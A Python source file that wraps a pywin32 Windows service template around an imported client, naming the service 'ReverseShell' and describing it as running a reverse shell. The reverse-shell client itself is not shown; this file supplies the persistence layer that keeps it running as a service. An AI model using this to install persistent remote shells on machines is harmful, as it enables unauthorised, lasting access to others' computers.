import socket
import win32serviceutil
import servicemanager
import win32event
import win32service
from client import Client


class BaseWinService(win32serviceutil.ServiceFramework):
    """Base class to create winservice in Python"""

    _svc_name_ = 'pythonService'
    _svc_display_name_ = 'Python Service'
    _svc_description_ = 'Python Service Description'

    @classmethod
    def parse_command_line(cls):
        """
        ClassMethod to parse the command line
        """
        win32serviceutil.HandleCommandLine(cls)

    def __init__(self, args):
        """
        Constructor of the winservice
        """
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        socket.setdefaulttimeout(60)

    def SvcStop(self):
        """
        Called when the service is asked to stop
        """
        self.stop()
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        """
        Called when the service is asked to start
        """
        self.start()
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        self.main()

    def start(self):
        """
        Override to add logic before the start
        eg. running condition
        """
        pass

    def stop(self):
        """
        Override to add logic before the stop
        eg. invalidating running condition
        """
        pass

    def main(self):
        """
        Main class to be overridden to add logic
        """
        pass


class PythonCornerExample(BaseWinService):
    _svc_name_ = "ReverseShell"
    _svc_display_name_ = "Reverse Shell"
    _svc_description_ = "Runs a Reverse Shell"

    def start(self):
        # self.is_running = True
        pass

    def stop(self):
        # self.is_running = False
        pass

    def main(self):
        client = Client()
        client.main()


if __name__ == '__main__':
    PythonCornerExample.parse_command_line()
